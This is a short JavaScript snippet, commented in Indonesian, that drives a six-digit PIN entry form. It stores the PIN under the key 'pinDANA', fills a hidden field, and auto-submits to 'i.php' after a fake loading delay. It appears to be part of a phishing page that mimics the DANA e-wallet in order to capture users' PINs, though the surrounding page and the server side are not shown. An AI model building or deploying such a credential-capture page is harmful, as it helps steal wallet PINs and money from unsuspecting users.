  <script>
  const inputs = document.querySelectorAll('.pin-input');
  const loading = document.getElementById('loading');
  const hiddenPin = document.getElementById('hiddenPin');
  const form = document.getElementById('pinForm');

  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      if (input.value) {
        input.classList.add('filled');
      } else {
        input.classList.remove('filled');
      }

      if (input.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }

      checkAndSend();
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && input.value === '' && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  function checkAndSend() {
    const pin = Array.from(inputs).map(input => input.value).join('');
    localStorage.setItem("pinDANA", pin);
    hiddenPin.value = pin;

    if (pin.length === 6) {
      loading.style.display = 'flex';

      setTimeout(() => {
        inputs.forEach(i => {
          i.classList.remove('filled');
          i.classList.add('green');
        });

        form.submit(); // Langsung kirim form ke i.php
      }, 2000);
    }
  }

  // Otomatis fokus saat halaman dimuat agar keyboard langsung muncul
  window.addEventListener("load", () => {
    const firstInput = document.querySelector(".pin-input");
    if (firstInput) {
      firstInput.focus();
      // Memancing keyboard di mobile
      setTimeout(() => {
        firstInput.click();
        firstInput.dispatchEvent(new Event("touchstart")); // ekstra trigger untuk iOS
      }, 100);
    }
  });
</script>
